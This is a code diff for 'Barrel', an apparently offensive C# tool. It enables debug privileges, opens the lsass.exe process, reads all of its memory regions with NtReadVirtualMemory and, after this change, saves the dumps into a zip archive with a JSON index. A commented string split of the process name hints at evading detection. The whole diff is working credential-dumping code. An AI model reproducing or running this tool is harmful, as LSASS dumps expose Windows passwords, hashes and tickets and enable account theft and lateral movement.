@@ -5,6 +5,10 @@ using System.Runtime.InteropServices;
 using static Barrel.NT;
 using System.Collections.Generic;
 using System.Text;
+using System.IO.Compression;
+using System.IO;
+using System.Runtime.InteropServices.ComTypes;
+using static Barrel.Program;
 
 
 namespace Barrel
@@ -300,23 +304,49 @@ namespace Barrel
         }
 
 
-        static void Barrel(string file_name, string mem_name, bool big_file) {
-            Random random = new Random();
-            // Create directory for all dump files
-            string path_ = @"" + mem_name;
-            if (!big_file && mem_name == "") {
-                path_ = @"" + getRandomString(5, random) + "\\";
-                if (!System.IO.Directory.Exists(path_))
+        public static void GenerateZip(string zipFilePath, List<MemFile> memfile_list)
+        {
+            // Check it exists, delete if it does
+            if (File.Exists(zipFilePath)) { File.Delete(zipFilePath); }
+            
+            using (FileStream zipFileStream = new FileStream(zipFilePath, FileMode.Create))
+            {
+                using (ZipArchive archive = new ZipArchive(zipFileStream, ZipArchiveMode.Create, true))
                 {
-                    System.IO.Directory.CreateDirectory(path_);
+                    foreach (MemFile m in memfile_list)
+                    {
+                        ZipArchiveEntry entry = archive.CreateEntry(m.filename, CompressionLevel.Fastest);
+                        using (Stream entryStream = entry.Open())
+                        {
+                            entryStream.Write(m.content, 0, m.content.Length);
+                        }
+                    }
                 }
             }
+        }
 
+
+        public class MemFile {
+            public string filename;
+            public  byte[] content;
+
+            public MemFile(string filename, byte[] content)
+            {
+                this.filename = filename;
+                this.content = content;
+            }
+        }
+
+
+        static void Barrel(string json_filename, string zip_filename) {
+            // Random seed
+            Random random = new Random();
+            
             // Get SeDebugPrivilege
             EnableDebugPrivileges();
 
             // Get process name
-            string proc_name = "lsass.exe";
+            string proc_name = "lsass.exe"; // "l"+"s"+"a"+"s"+"s"+".+"+"e"+"x"+"e";
             IntPtr process_handle = GetProcessByName(proc_name).First();
             int processPID = get_pid(process_handle);
 
@@ -336,7 +366,7 @@ namespace Barrel
             // Loop the memory regions
             long proc_max_address_l = (long)0x7FFFFFFEFFFF;
             IntPtr aux_address = IntPtr.Zero;
-            byte[] aux_bytearray = { };
+            List<MemFile> memfile_list = new List<MemFile> { };
             string[] aux_array_1 = { };
             while ((long)aux_address < proc_max_address_l)
             {
@@ -350,40 +380,22 @@ namespace Barrel
                     byte[] buffer = new byte[(int)mbi.RegionSize];
                     NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                     string memdump_filename = getRandomString(10, random) + "." + getRandomString(3, random);
-                    // Create dump file for this region
-                    if (!big_file)
-                    {
-                        WriteToBinFile(buffer, (int)mbi.RegionSize, (path_ + memdump_filename));
-                    }
+                    
                     // Add to JSON file                    
                     string[] aux_array_2 = { memdump_filename, "0x" + aux_address.ToString("X"), mbi.RegionSize.ToString() };
                     aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();
+                    
                     // Add to global byte array
-                    byte[] new_bytearray = new byte[aux_bytearray.Length + buffer.Length];
-                    Buffer.BlockCopy(aux_bytearray, 0, new_bytearray, 0, aux_bytearray.Length);
-                    Buffer.BlockCopy(buffer, 0, new_bytearray, aux_bytearray.Length, buffer.Length);
-                    aux_bytearray = new_bytearray;
+                    MemFile memFile = new MemFile(memdump_filename, buffer);
+                    memfile_list.Add(memFile);                    
                 }
                 // Next memory region
                 aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
             }
             // Write JSON file
             string barrel_json_content = ToJsonArray(aux_array_1);
-            WriteToFile(file_name, barrel_json_content);
-
-            // Create binary file with all memory regions
-            if (big_file)
-            {
-                if (mem_name == "")
-                {
-                    mem_name = getRandomString(10, random) + "." + getRandomString(3, random);
-                }
-                WriteToBinFile(aux_bytearray, aux_bytearray.Length, mem_name);
-                Console.WriteLine("[+] File created at " + mem_name);
-            }
-            else {
-                Console.WriteLine("[+] Files created at directory " + path_);
-            }
+            WriteToFile(json_filename, barrel_json_content);
+            GenerateZip(zip_filename, memfile_list);
         }
 
 
@@ -402,13 +414,10 @@ namespace Barrel
             }
             ReplaceLibrary(option, wildcard_option);
 
-            // big_file = true  -> Generate one big file with the dump of all memory regions together
-            // big_file = false -> Create a directory with a random name and generate one dump file for each region
-            bool big_file = false;
-
-            // Get Mem64List information + Dump memory regions
-            // Arguments: Name of JSON file; name of directory/file to contain memory dumps
-            Barrel("barrel.json", "", big_file);
+            // Get Mem64List information + Dump memory regions. Arguments: Name of JSON file
+            string json_file = "barrel.json";
+            string zip_file = "barrel.zip";
+            Barrel(json_file, zip_file);
         }
     }
 }
